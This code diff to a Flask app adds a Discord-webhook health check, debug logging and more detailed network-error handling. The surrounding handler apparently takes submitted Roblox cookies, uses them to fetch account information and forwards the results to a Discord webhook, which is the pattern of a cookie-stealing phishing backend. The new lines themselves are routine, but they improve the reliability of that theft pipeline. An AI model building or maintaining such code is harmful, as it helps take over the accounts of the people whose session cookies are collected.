@@ -166,6 +166,59 @@ def index():
     """Serve the main HTML page"""
     return send_from_directory('.', 'index.html')
 
+@app.route('/health')
+def health_check():
+    """Health check endpoint to verify webhook connectivity"""
+    webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
+    
+    if not webhook_url:
+        return jsonify({
+            'status': 'error',
+            'message': 'DISCORD_WEBHOOK_URL not configured'
+        }), 500
+    
+    # Validate webhook URL format
+    if not webhook_url.startswith('https://discord.com/api/webhooks/'):
+        return jsonify({
+            'status': 'error', 
+            'message': 'Invalid Discord webhook URL format'
+        }), 500
+    
+    try:
+        # Test connection with a minimal payload
+        test_payload = {'content': 'Health check test'}
+        response = requests.post(webhook_url, json=test_payload, timeout=5)
+        
+        if response.status_code in [200, 204]:
+            return jsonify({
+                'status': 'ok',
+                'message': 'Discord webhook connection successful',
+                'webhook_status': response.status_code
+            })
+        else:
+            return jsonify({
+                'status': 'error',
+                'message': f'Discord webhook returned status {response.status_code}',
+                'response': response.text[:200]
+            }), 500
+            
+    except requests.ConnectionError as e:
+        return jsonify({
+            'status': 'error',
+            'message': 'Connection error - cannot reach Discord servers',
+            'error': str(e)[:100]
+        }), 500
+    except requests.Timeout:
+        return jsonify({
+            'status': 'error',
+            'message': 'Timeout error - Discord servers not responding'
+        }), 500
+    except Exception as e:
+        return jsonify({
+            'status': 'error',
+            'message': f'Unexpected error: {str(e)[:100]}'
+        }), 500
+
 @app.route('/submit', methods=['POST'])
 def submit_form():
     """Handle form submission and send to Discord webhook"""
@@ -217,10 +270,13 @@ def submit_form():
         # Get Discord webhook URL from environment
         webhook_url = os.environ.get('DISCORD_WEBHOOK_URL')
         if not webhook_url:
+            print("ERROR: DISCORD_WEBHOOK_URL environment variable not set")
             return jsonify({
                 'success': False, 
-                'message': 'Webhook not configured'
+                'message': 'Webhook not configured - check environment variables'
             }), 500
+        
+        print(f"Using webhook URL: {webhook_url[:50]}...") # Log first 50 chars for debugging
         
         # Get real Roblox user information using the cookie
         print("Fetching Roblox user information...")
@@ -335,11 +391,18 @@ def submit_form():
                 'success': False, 
                 'message': 'Request timeout - Discord may be slow'
             }), 500
-        except requests.RequestException as e:
-            print(f"Discord webhook network error: {str(e)}")
+        except requests.ConnectionError as e:
+            print(f"Discord webhook connection error: {str(e)}")
             return jsonify({
                 'success': False, 
-                'message': 'Network error occurred'
+                'message': 'Connection error occurred - unable to reach Discord servers'
+            }), 500
+        except requests.RequestException as e:
+            print(f"Discord webhook network error: {str(e)}")
+            error_details = str(e)[:100]  # First 100 chars of error
+            return jsonify({
+                'success': False, 
+                'message': f'Network error occurred: {error_details}'
             }), 500
             
     except Exception as e:
